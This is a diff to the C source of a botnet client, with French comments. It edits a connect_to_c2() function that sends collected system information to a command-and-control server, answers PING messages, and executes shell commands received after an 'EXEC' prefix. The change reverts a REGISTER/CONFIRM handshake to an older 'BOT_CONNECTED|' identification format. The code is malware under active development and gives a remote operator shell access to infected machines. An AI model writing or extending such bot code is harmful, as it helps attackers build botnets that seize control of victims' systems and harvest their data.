@@ -946,22 +946,17 @@ void connect_to_c2() {
             continue;
         }
         
-        // Générer un identifiant unique pour ce bot
-        generate_device_id();
-        
         // Collecter les informations système
         system_info = collect_system_info();
         
-        // Envoyer les informations d'identification avec le nouveau format REGISTER
+        // Envoyer les informations d'identification avec l'ancien format BOT_CONNECTED
         if (system_info) {
             char bot_id[BUFFER_SIZE * 5];
-            sprintf(bot_id, "REGISTER %s %s", device_id, system_info);
+            sprintf(bot_id, "BOT_CONNECTED|%s", system_info);
             send(sockfd, bot_id, strlen(bot_id), 0);
             free(system_info);
         } else {
-            char bot_id[BUFFER_SIZE];
-            sprintf(bot_id, "REGISTER %s Unknown Device", device_id);
-            send(sockfd, bot_id, strlen(bot_id), 0);
+            send(sockfd, "BOT_CONNECTED|Unknown Device", 28, 0);
         }
         
         // Boucle principale pour recevoir et exécuter les commandes
@@ -980,18 +975,6 @@ void connect_to_c2() {
             if (strncmp(buffer, "PING", 4) == 0) {
                 // Répondre au ping
                 send(sockfd, "PONG", 4, 0);
-            } else if (strncmp(buffer, "CONFIRM ", 8) == 0) {
-                // Confirmation d'enregistrement du serveur C2
-                // Le serveur envoie "CONFIRM <device_id>" après un REGISTER réussi
-                char confirmed_id[DEVICE_ID_SIZE];
-                sscanf(buffer + 8, "%63s", confirmed_id);
-                
-                // Vérifier si l'ID confirmé correspond à notre ID
-                if (strcmp(confirmed_id, device_id) == 0) {
-                    // Enregistrement confirmé, on peut continuer
-                    // Optionnel : envoyer un accusé de réception
-                    send(sockfd, "CONFIRM_ACK", 11, 0);
-                }
             } else if (strncmp(buffer, "EXEC ", 5) == 0) {
                 // Exécuter une commande shell
                 char* result = execute_command(buffer + 5);
